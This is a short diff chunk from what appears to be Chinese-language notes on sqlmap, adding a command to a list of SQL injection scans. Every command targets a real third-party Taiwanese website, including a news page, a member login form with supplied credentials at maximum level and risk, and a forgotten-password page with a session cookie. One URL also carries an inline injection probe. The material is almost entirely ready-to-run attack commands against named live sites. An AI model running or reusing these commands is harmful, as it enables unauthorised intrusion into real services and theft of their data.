@@ -21,6 +21,8 @@ $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131 --force-ssl --dbms 
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131+AND+1%3D1+--+
 
 $ sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf,password=1aabac6d068eef6a7bad3fdf50a05cc8" --param-del="," -p "id,password" -T4 -v3 --level 5 --risk 3
+
+sqlmap -u http://careis.gdc.com.tw/car_open/forgotPassword.asp ASPSESSIONIDSAQRQBBB=ECPHJHMACADBGEMCOFCOFAKL
 ```
 指定參數
 ```
